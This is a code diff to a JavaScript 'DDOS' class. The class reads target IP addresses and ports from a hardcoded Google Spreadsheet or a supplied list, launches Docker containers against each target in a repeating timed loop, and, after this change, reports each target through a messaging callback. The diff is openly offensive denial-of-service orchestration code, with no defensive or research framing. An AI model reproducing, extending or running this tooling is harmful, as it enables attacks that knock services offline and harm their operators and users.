@@ -11,12 +11,13 @@ const SUCCESS_SLEEP_SECONDS = process.env.SUCCESS_SLEEP_SECONDS || 30;
 const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
 
 class DDOS {
-  constructor({ targets = [] }) {
+  constructor({ targets = [], sendMessage }) {
     this.targets = targets;
     this.isTargets = false;
     this.doc = new GoogleSpreadsheet(
       "1CGimNXk_8zQoIHoVPC_XvtbIqEt2QiWR4LDtAgzRtmU"
     );
+    this.sendMessage = sendMessage;
   }
 
   cleanRunningDockerContainers = async () => {
@@ -61,14 +62,17 @@ class DDOS {
     try {
       if (this.targets.length) {
         this.isTargets = true;
+        this.sendMessage("DDOS from targets");
         console.log("DDOS from targets");
         for (let i = 0; i < TARGET_COUNT; i++) {
           const target = this.targets.pop();
+          this.sendMessage(`DDOS => ${target}`);
           console.log(`DDOS => ${target}`);
           this.runDocker(target);
         }
       } else {
         this.isTargets = false;
+        this.sendMessage("DDOS from GoogleSpreadsheet");
         console.log("DDOS from GoogleSpreadsheet");
 
         // https://theoephraim.github.io/node-google-spreadsheet/#/getting-started/authentication
@@ -87,6 +91,7 @@ class DDOS {
 
         for (let i = 0; i < randomRows.length; i++) {
           const { IP, PORT, DESCRIPTION } = randomRows[i];
+          this.sendMessage(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
           console.log(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
           this.runDocker(`${IP}:${PORT}`);
         }
@@ -95,17 +100,26 @@ class DDOS {
       console.log("err", err);
     }
 
-    await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
-    // await sleep(SUCCESS_SLEEP_SECONDS * 1000);
+    setTimeout(() => {
+      console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
+      this.ddos({ count: _count + 1 });
+    }, (ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
 
-    console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
+    // await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
+    // // await sleep(SUCCESS_SLEEP_SECONDS * 1000);
 
-    return this.ddos({ count: _count + 1 });
+    // console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
+
+    // return this.ddos({ count: _count + 1 });
   }
 
   addTargets(targets) {
     const newTargets = [...new Set([...this.targets, ...targets])];
     this.targets = newTargets;
+  }
+
+  async getRunnigContainers() {
+    return docker.listContainers();
   }
 
   async run() {
